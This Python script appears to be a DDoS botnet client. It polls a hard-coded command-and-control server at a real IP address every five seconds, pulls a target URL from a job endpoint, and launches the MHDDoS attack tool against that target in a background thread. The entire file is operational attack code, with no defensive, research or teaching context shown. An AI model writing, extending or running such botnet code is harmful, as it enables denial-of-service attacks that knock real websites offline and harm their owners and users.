import requests
from mhddos import runner
import time
import threading

class ThreadManager:
    def __init__(self):
        self.threads = []

    def add_thread(self, thread):
        self.threads.append(thread)

    def stop_all_threads(self):
        for thread in self.threads:
            print("Meow")
            thread.join()


base_url = "http://128.140.126.18:5000"  # Replace "your_base_url" with the actual base URL
current_target = None  # Variable to store the current target
thread_manager = ThreadManager()  # Thread manager to keep track of threads


def stop():
    # Stop all threads before cleanup
    thread_manager.stop_all_threads()
    # Add logic to stop the MHDDoS job or perform any necessary cleanup
    print("Stopping the current job")

def ping():
    global current_target
    # Run this function every 5 seconds to check for new jobs
    response = requests.get(f"{base_url}/ping/").json()

    if response["prioritize"]:
        new_target = get_target()
        if new_target != current_target:
            stop()
            print(new_target)
            # Start the work function in a separate thread
            thread = threading.Thread(target=work, args=(new_target,))
            thread_manager.add_thread(thread)
            thread.start()
    else:
        new_target = get_target()
        if new_target != current_target:
            stop()
            print(new_target)
            # Start the work function in a separate thread
            thread = threading.Thread(target=work, args=(new_target,))
            thread_manager.add_thread(thread)
            thread.start()

def get_target():
    # Fetch the job details from the server
    target = requests.get(f"{base_url}/get_job/").json()
    return target

def work(target):
    global current_target
    current_target = target
    # Perform the specified job based on job_type
    # if target["job_type"] == "DDoS":
    runner.run(target["url"])
    # checker.run(target["url"])
    # Add additional conditions for other job types if needed

# Add a loop to run the ping function every 5 seconds
if __name__ == "__main__":
    try:
        while True:
            ping()
            time.sleep(5)  # Sleep for 5 seconds before the next iteration

    except KeyboardInterrupt:
        exit(2)
